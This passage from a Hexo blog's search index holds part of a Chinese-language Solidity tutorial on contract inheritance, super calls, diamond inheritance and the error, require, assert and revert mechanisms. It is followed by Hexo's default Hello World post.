class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract ye &#123;<br>event log(string msg);<br>function yeA() public virtual &#123;<br>emit log(&quot;ye_A&quot;);<br>    &#125; <br>        <br>function yeB() public virtual&#123;<br>emit log(&quot;ye_B&quot;);<br>&#125; <br><br>function yeye() public &#123;<br>emit log(&quot;yeye&quot;);<br>&#125; <br>&#125;<br><br>contract ba is ye &#123;<br>    function yeA() public virtual override &#123;<br>        emit log(&quot;ba_A&quot;);<br>    &#125;<br>    <br>    function yeB() public virtual override &#123;<br>        emit log(&quot;ba_B&quot;);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="多重继承"><a href="#多重继承" class="headerlink" title="多重继承"></a>多重继承</h3><p>规则：</p><ol><li>按辈分从高到低排，用<code>，</code>分隔。如用 <code>er</code> 继承 <code>ye</code> 和 <code>ba</code> 两个合约，应写作 <code>contract er is ye, ba &#123;&#125;</code></li><li>若一个函数在多个继承的合约中存在，在子合约中必须重写。如 <code>ba</code> 和 <code>ye</code> 同时有 <code>yeA</code> 函数，在子函数 <code>er</code> 中必须对它重写</li><li>重写在多个父合约中存在的函数时，<code>override</code> 后必须加上所有父合约的名字，顺序无所谓。</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract er is ye, ba &#123;<br>    function yeA() public virtual override(ba, ye) &#123;<br>        emit log(&quot;er_A&quot;);<br>    &#125;<br>    <br>    function yeB() public virtual override(ye, ba) &#123;<br>        emit log(&quot;er_B&quot;);<br>    &#125;<br><br>    function erzi() public &#123;<br>        emit log(&quot;erzi&quot;);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="修饰器的继承"><a href="#修饰器的继承" class="headerlink" title="修饰器的继承"></a>修饰器的继承</h3><p>用法与函数继承类似</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract evenAndOddNum &#123;<br>    modifier evenNum(uint _num) virtual &#123;<br>        require (_num % 2 == 0);<br>        _;<br>    &#125;<br><br>    function getIt(uint _num) public pure evenNum(_num) returns(uint) &#123;<br>        return (_num);<br>    &#125;<br>&#125;<br><br>contract oddNum is evenAndOddNum &#123;<br>    modifier evenNum(uint _num) virtual override&#123;<br>        require (_num % 2 != 0);<br>        _;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="构造函数的继承"><a href="#构造函数的继承" class="headerlink" title="构造函数的继承"></a>构造函数的继承</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract A &#123;<br>    uint public a;<br>    constructor(uint _a) &#123;<br>        a = _a;<br>    &#125;<br>    function getIt() public view returns(uint)&#123;<br>        return a;<br>    &#125;<br>&#125;<br>// 继承时声明 constructor 的参数<br>contract B is A(23) &#123;<br><br>&#125;<br>// 在子合约的构造函数中声明参数 <br>contract C is A &#123;<br>    constructor (uint _c) A(_c * 2)&#123;&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="调用父合约的函数"><a href="#调用父合约的函数" class="headerlink" title="调用父合约的函数"></a>调用父合约的函数</h3><ol><li>直接调用：用<code>父合约名.函数名()</code>调用。如在 <code>contract er</code> 中</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function callBa() public &#123;<br>ba.baba();<br>&#125;// log 中返回 &quot;baba&quot;<br></code></pre></td></tr></table></figure><ol><li><code>super</code>关键字：用 <code>super.函数名()</code> 调用最近父合约的函数。如 <code>contract er is ye, ba</code> 中，<code>ba</code> 是离 <code>er</code> 最近的父合约</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function callNear() public &#123;<br>super.yeA();<br>&#125;// log 中返回 &quot;ba_A&quot;<br></code></pre></td></tr></table></figure><h3 id="钻石继承"><a href="#钻石继承" class="headerlink" title="钻石继承"></a>钻石继承</h3><p>一个派生类有两个及以上的基类</p><ul><li>导致的问题：如果两个或多个合约定义了相同的函数，那么应该在子合约中调用哪个基础合约?</li><li>解决方式：借鉴 python 的 “方法解析顺序（Method Resolution Order，MRO）”，使用 C3线性化，强制一个由基类构成的 DAG（有向无环图）保持一个特定的顺序。（看不懂也无所谓，大概）</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs solidity">/*<br>    f<br>   /  \<br>  g1  g2<br>   \  /<br>    h<br>*/<br>contract f &#123;<br>    event log(string msg);<br>    function way1() public virtual &#123;<br>        emit log(&quot;f.way1&quot;);<br>    &#125;<br>    function way2() public virtual &#123;<br>        emit log(&quot;f.way2&quot;);<br>    &#125;<br>&#125;<br><br>contract g1 is f&#123;<br>    function way1() public virtual override&#123;<br>        emit log(&quot;g1.way1&quot;);<br>        super.way1();<br>    &#125;<br>    function way2() public virtual override&#123;<br>        emit log(&quot;g1.way2&quot;); <br>        super.way2();<br>    &#125;<br>&#125;<br><br>contract g2 is f&#123;<br>    function way1() public virtual override&#123;<br>        emit log(&quot;g2.way1&quot;);<br>        super.way1();<br>    &#125;<br>    function way2() public virtual override&#123;<br>        emit log(&quot;g2.way2&quot;);<br>        super.way2();<br>    &#125;<br>&#125;<br><br>contract h is g2, g1 &#123;<br>    function way1() public virtual override(g1, g2)&#123;<br>        emit log(&quot;h.way1&quot;);<br>        super.way1();<br>    &#125;<br>    function way2() public virtual override(g2, g1)&#123;<br>        emit log(&quot;h.way2&quot;);<br>        super.way2();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>运行 <code>h</code>中的 <code>way1</code>，输出顺序为：”h.way1”  —&gt;  “g1.way1”  —&gt;  “g2.way1”  —&gt;  “f.way1”</p><h2 id="14-异常"><a href="#14-异常" class="headerlink" title="14. 异常"></a>14. 异常</h2><h3 id="Error"><a href="#Error" class="headerlink" title="Error"></a>Error</h3><p>在函数外定义异常，可以有参数，必须搭配 <code>revert</code> 使用。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs solidity">uint immutable const = 22;<br>error NotNum(string);// error NotNum(uint _errNum);<br>function useofRevertWithError(uint _num) external pure returns(bool)&#123;<br>    if (_num != const) &#123;<br>    revert NotNum(&quot;Not22&quot;);// revert NotNum(_num);<br>    &#125;<br>    return (true);<br>    &#125;<br></code></pre></td></tr></table></figure><h3 id="Require"><a href="#Require" class="headerlink" title="Require"></a>Require</h3><p>格式 <code>require(检查条件，“异常的描述”)</code> ，当条件不满足时抛出异常，只消耗调用 require 的 gas。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function useofRequire(uint _num) external pure returns(bool) &#123;<br>require(_num == const,&quot;Not22&quot;);// 只有 _num 为 22 时才返回 true，否则抛出异常，描述为“Not22”<br>return (true);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Assert"><a href="#Assert" class="headerlink" title="Assert"></a>Assert</h3><p>不能解释异常原因，一般用于写程序 debug。用法 <code>assert(检查条件)</code>，检查条件不满足时抛出异常，消耗所有 gas。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function useofAssert(uint _num) external pure returns(bool) &#123;<br>assert(_num == const);//  只有 _num 为 22 时才返回 true，否则抛出异常，无法描述<br>return (true);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Revert"><a href="#Revert" class="headerlink" title="Revert"></a>Revert</h3><p><code>revert</code>  可以单独使用，用法 <code>revert(&quot;异常描述&quot;);</code>，只消耗调用 revert 的 gas。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function useofRevertOnly(uint _num) external pure returns(bool)&#123;<br>if (_num != const) &#123;<br>revert (&quot;Not22&quot;);<br>&#125;<br>    return (true);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="gas-消耗"><a href="#gas-消耗" class="headerlink" title="gas 消耗"></a>gas 消耗</h3><ul><li>结论：<code>error</code> &lt; <code>assert</code> &lt; <code>require</code></li><li>多用 <code>error</code></li></ul><hr>]]></content>
    
    
    
    <tags>
      
      <tag>Solidity</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2024/11/27/hello-world/"/>
    <url>/2024/11/27/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
